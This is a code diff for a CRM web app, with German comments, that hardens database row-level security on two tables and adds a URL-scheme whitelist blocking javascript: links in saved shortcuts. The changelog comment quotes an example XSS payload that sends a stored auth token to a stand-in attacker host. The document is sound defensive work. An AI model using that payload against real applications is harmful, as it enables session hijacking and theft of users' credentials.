@@ -1,6 +1,33 @@
 /* ═══════════════════════════════════════════════════════════
    CRM – Application Script (Branding pro Mandant via config.js)
-   Version 2.33.2 (QA-Sweep Bugfix #3 — Mitgliedschafts-Phantom-
+   Version 2.33.3 (QA-Sweep Bugfix #4 — RLS-Härtung +
+   Shortcut-URL-Whitelist. Aus der Phase-A.3-Cluster-5-Verifi-
+   kation: `services` und `shortcuts` hatten beide
+   `*_all_authenticated` PERMISSIVE-Policies mit `qual=true` /
+   `check=true` — jeder authenticated User konnte direkt via
+   DevTools schreiben, obwohl die UI die Modale über
+   `nav-settings-group data-admin-only` ausblendet. Die UI-
+   Gatung war Client-only, kein Insider-Schutz. **Migration
+   `v2.33.3_admin_write_shortcuts_services.sql`** (appliziert
+   28.05.2026) ersetzt beide Policies durch je ein Trio analog
+   zu `lookup_values`: SELECT für alle authenticated +
+   `services_modify_admin` / `shortcuts_modify_admin` mit
+   `is_admin()` als USING und WITH CHECK. RESTRICTIVE
+   `only_active_users` bleibt unverändert. **`saveShortcut`
+   URL-Scheme-Whitelist** (XSS #4): die `url`-Spalte war ohne
+   Validierung — ein Admin (oder im Vor-Migrations-Stand JEDER
+   User) hätte `javascript:fetch('//attacker/?'+localStorage.
+   getItem('sb-...-auth-token'))` als Shortcut anlegen können,
+   der dann im Origin der CRM-App ausgeführt wird, sobald
+   irgendjemand den Quick-Link klickt. Token-Hijack. Fix in
+   `app.js:27348`: nur `http(s):`, `mailto:`, `tel:` zugelassen,
+   sonst Toast „URL muss mit http://, https://, mailto: oder
+   tel: beginnen.". Auch Audit-Befund A.3 #12 (RLS-Verifikation)
+   damit bestätigt: alle anderen geprüften Tabellen
+   (`lookup_values`, `roles`, `templates`, `user_profiles`) sind
+   bereits korrekt admin-gated; nur `services`/`shortcuts`
+   waren die offenen Lücken.
+   Vorgängerversion 2.33.2 (QA-Sweep Bugfix #3 — Mitgliedschafts-Phantom-
    Boni + stornierte Einsätze in der Projekt-Auto-Status-Logik.
    **Cluster 7:** Eine soft-gelöschte Mitgliedschaft hinterließ
    ihre Entitlements weiter im Bonus-Picker des Einsatz-Modals
@@ -27350,6 +27377,14 @@ async function saveShortcut() {
   const url = document.getElementById('sc-url').value.trim();
   if (!label) { showToast('Label ist Pflicht.', true); return; }
   if (!url)   { showToast('URL ist Pflicht.', true); return; }
+  // v2.33.3: URL-Scheme-Whitelist gegen XSS-Vektor (Phase A.3 #4).
+  // `javascript:`-URIs würden im Origin der App ausgeführt → Token-Hijack.
+  // Erlaubt: http(s), mailto, tel. Andere Schemes oder Scheme-lose Werte
+  // (die der Browser als relative URL zur App auflöst) werden abgelehnt.
+  if (!/^(https?|mailto|tel):/i.test(url)) {
+    showToast('URL muss mit http://, https://, mailto: oder tel: beginnen.', true);
+    return;
+  }
   const payload = {
     label, url,
     icon: document.getElementById('sc-icon').value.trim() || null,
